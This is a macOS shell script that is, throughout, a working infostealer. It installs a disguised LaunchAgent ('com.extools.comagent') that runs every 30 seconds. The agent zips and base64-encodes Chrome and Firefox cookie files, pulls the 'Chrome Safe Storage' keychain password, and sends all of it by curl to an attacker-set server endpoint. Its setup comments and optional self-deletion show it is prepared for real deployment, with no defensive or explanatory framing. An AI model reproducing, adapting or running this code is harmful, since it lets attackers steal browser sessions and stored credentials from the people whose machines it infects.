#!/bin/sh
#before use:
# change agent interval
# set annoyer time waits
# set server endpoint
# uncomment autoremove

u=$(whoami)
folder="/Users/$u/.config/cache"
cfile=cached.dat;endpoint="https://<server>"
if [ ! -e $folder ]; then
    mkdir -p "$folder"
fi
launcherpath="/Users/$u/Library/LaunchAgents"
launcher="com.extools.comagent"
flag="/var/tmp/flag"
cat > $folder/$launcher <<_EOF
zip -eP CacheBucketList "$folder/c.zip" /Users/$u/Library/Application\ Support/Google/Chrome/*/Cookies
base64 -i "$folder/c.zip" -o "$folder/cb64"
rm "$folder/c.zip"
read c < "$folder/cb64"
curl -k --data-urlencode "c=\$c" --data-urlencode "u=$u" $endpoint/bucket1 2>&1 > /dev/null
zip -eP CacheBucketList "$folder/c.zip" /Users/$u/Library/Application\ Support/Google/Chrome/*/Cookies
base64 -i "$folder/c.zip" -o "$folder/cb64"
rm "$folder/c.zip"
read c < "$folder/cb64"
curl -k --data-urlencode "c=\$c" --data-urlencode "u=$u" $endpoint/bucket1 2>&1 > /dev/null
rm "$folder/cb64"
zip -eP CacheBucketList "$folder/c.zip" /Users/$u/Library/Application\ Support/Firefox/Profiles/*/cookies.sqlite
base64 -i "$folder/c.zip" -o "$folder/cb64"
rm "$folder/c.zip"
read c < "$folder/cb64"
curl -k --data-urlencode "c=\$c" --data-urlencode "u=$u" $endpoint/bucket2 2>&1 > /dev/null
rm "$folder/cb64"
if [ ! -e "$folder/$cfile" ] && [ ! -e $flag ] && [ -e /var/tmp/temp ];then
    rm /var/tmp/temp
    sleep 10
    if [ ! "\$(ps -ef|grep Chrome|grep -v grep)" = "" ];then
    killall -9 'Google Chrome'
    sleep 2
    open -g -a "Google Chrome"
    sleep 1
    security find-generic-password -s 'Chrome Safe Storage' -w > "$folder/$cfile"
    if [ \$? -eq 0 ];then
        read c < "$folder/$cfile"
        curl -k --data-urlencode "i=\$c" --data-urlencode "u=$u" $endpoint/index 2>&1 > /dev/null
        touch $flag
    else 
        rm "$folder/$cfile"
    fi
    sleep 15
fi
else 
    touch /var/tmp/temp
fi
_EOF
chmod +x $folder/$launcher
cat > "$launcherpath"/"$launcher".plist <<_EOF
<plist version="1.0">
    <dict>
    <key>Label</key>
        <string>$launcher</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>$folder/$launcher</string>
    </array>
    <key>RunAtLoad</key>
        <true/>
    <key>StartInterval</key>
        <integer>30</integer>
    <key>AbandonProcessGroup</key>
        <true/>
    </dict>
</plist>
_EOF
launchctl load "$launcherpath"/"$launcher".plist
#rm -f $0
